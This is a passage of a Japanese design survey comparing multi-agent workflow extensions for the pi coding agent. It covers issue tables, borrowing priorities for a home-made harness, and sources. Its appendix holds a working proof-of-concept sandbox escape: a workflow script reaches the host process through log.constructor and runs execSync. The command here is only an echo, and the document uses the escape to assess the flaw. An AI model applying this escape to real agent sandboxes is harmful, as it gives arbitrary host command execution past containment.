| 高並列で子が `null` を多発 | #4（close 後も再報告） | 空の出力を回復可能として再試行する対処（`workflow.ts:1437`）は入ったが、provider 側の拒否（#231）は見えにくい。**並列を上げると原因不明の欠損が増える**。台帳は欠損を「failed + 理由」で残す |
| 子が 80 分止まったまま | #150 | 道具（bash）の呼び出しが固まった。**既定でタイムアウトも watchdog も無い**。作者回答: 無いと明言。自作は無出力の watchdog で上回れる |
| `maxAgents` 超過で完了済みの分が無駄に | #146 | 上限は**再開で上げられる**ように修正（#156）。**予約方式と journal をセットにすべき**根拠 |
| メモリが増え続けて 3〜4 run で OOM | #109 | 子が同一プロセスのセッションで、拡張を毎回読んでいた。共有の resource loader で緩和。**同一プロセス方式は並列を上げるとメモリが先に尽きる**。別プロセス方式の自作は、プロセスの数が上限になる（別の天井） |
| 永続化の書き込みが O(n²)（約 190 倍） | #225 | 子の数が増えると run ファイルの再書き込みが律速。**台帳は追記型（JSONL）にする**根拠 |
| 起動で全履歴を同期 parse | #226 | 同上。台帳は先頭だけを読む作りにする |
| 組み込みコマンドがセッションを塞ぐ | #104 | 同期で走らせたため、実行中の入力が全て飲まれた。**背景で走らせる**（v3.2.0 で修正） |
| 背景の結果が届かない・別セッションに届く・二重配送 | #142・#147・#175・#185・#235（open） | 結果を会話へ戻す配送が、並列の数だけ複雑になる。**親が待たない設計は配送が壊れると全体が止まる**。自作の完了通知は別経路（既に実装）だが、同じ穴を作らないよう**通知の欠落を台帳で検知する**（結果のパスがあれば取りこぼしても回収できる） |
| 429 で run が止まる・自動再開が回数を忘れる | #26・#27・#106・#207 | 一時停止と自動再開は借りるが、**再開の回数・待ち時間の状態も台帳に永続する**（#207 の教訓） |
| 子が 1 つの run を `running` のまま残す | #171 | abort・失敗時に子の状態を確定しないと、台帳の合計が合わない。終了時に必ず `aborted` へ落とす |
| 再帰で上限を迂回 | #107 | 子に `workflow` を使わせない（既定で除外）。自作は子の許可リストで既に防ぐ（`task` の許可リスト） |

#### J-7 借用の優先順位（並列度への効き × 費用）

| 順 | 借用 | 効く上限の層 | 費用の見積もり（推測） |
| --- | --- | --- | --- |
| 1 | **壁を作らない流し方**（`pipeline` 型。完了した子から次段を起動）と、台帳の `needs` による依存の表現 | 協調・親 | 台帳のスケジューラ 1 つ（約 200 行）。**今の「波ごとにそろうまで待つ」を置き換える** |
| 2 | **中間結果を親の文脈に入れない**（ファイルと要約だけ親へ。reduce は台帳の 1 ノード）と、台帳 1 つを 1 回で起動 | 親 | 結果の書式と `schema`（約 100 行）+ 返答の上限の見直し。**親の往復が最も減る** |
| 3 | **起動前の予約（件数・予算）＋ 429 は停止して journal から再開 ＋ AIMD で生存数を動かす** | 資源 | 予約と再開は MVP に含む。AIMD は約 80 行。**並列度を上げる前提の安全網** |
| 4 | **`writes` の宣言で重なる task を自動で直列に**（(A) に無い。自作で上回る） | 協調 | 約 100 行 + 台帳の検証器。親の手作業の割り当てを消す |
| 5 | 失敗は `null` でなく台帳の `{status, reason}`。空の出力は再試行。stall の watchdog | 親・資源 | 既存の分類の延長 |

**生存数 6 を上げるか**: 資源の上限（別プロセスのメモリ・provider の同時接続）は未計測。まず 2・3 を入れて**生存数を 6 → 8〜12 に上げ、429 と OOM を見ながら AIMD で調整**するのが、
(A) の 16 や 1000 という数を真似るより安全（推測。実測は未実施）。

### 付録: 再現用スクリプト

`poc/escape.mts`（無害な `echo` だけを実行）:

```ts
import { runWorkflow } from "../sources/repoA/src/workflow.ts";
const script = `export const meta = { name: 'poc', description: 'escape poc' }
const HostFunction = log.constructor;
const hostProcess = HostFunction('return process')();
const cp = hostProcess.getBuiltinModule('node:child_process');
const out = cp.execSync('echo ESCAPED-FROM-VM').toString().trim();
const a = await agent('noop');
return { out, a, hostPid: hostProcess.pid };`;
const stub = { run: async () => "stub" };
const r = await runWorkflow(script, { agent: stub as never, persistLogs: false });
console.log(JSON.stringify(r.result));
```

### 出典

取得日はいずれも 2026-11-05。

- (A) tarball: <https://registry.npmjs.org/@quintinshaw/pi-dynamic-workflows/-/pi-dynamic-workflows-3.15.0.tgz>（3.15.0）
- (A) リポジトリ: <https://github.com/QuintinShaw/pi-dynamic-workflows>（`af8c0ed`・`v3.15.0`）。issue #24・#107・#231 ほか、PR 184 件
- (B) リポジトリ: <https://github.com/Michaelliv/pi-dynamic-workflows>（1.0.1）。PR #18: <https://github.com/Michaelliv/pi-dynamic-workflows/pull/18>
- npm のファイル一覧: <https://unpkg.com/@quintinshaw/pi-dynamic-workflows@3.15.0/?meta>
- 自作側: `home/dot_config/pi/harness/children.ts`・`index.ts`・`worktree.ts`・`model-choice.ts`、`home/dot_config/agents/common.toml.tmpl`（`[pi.commands.fleet]`）、
  `scripts/bundle.py`、`.agents/skills/feature-orchestration/SKILL.md`、[ADR-0016](../../adr/0016-pi-extensions-own-first.md)、
  [pi-public-extensions-survey](pi-public-extensions-survey.md)（`@quintinshaw/pi-dynamic-workflows` を分類のみで挙げた P1）、
  [pi-orchestrator-survey](pi-orchestrator-survey.md)
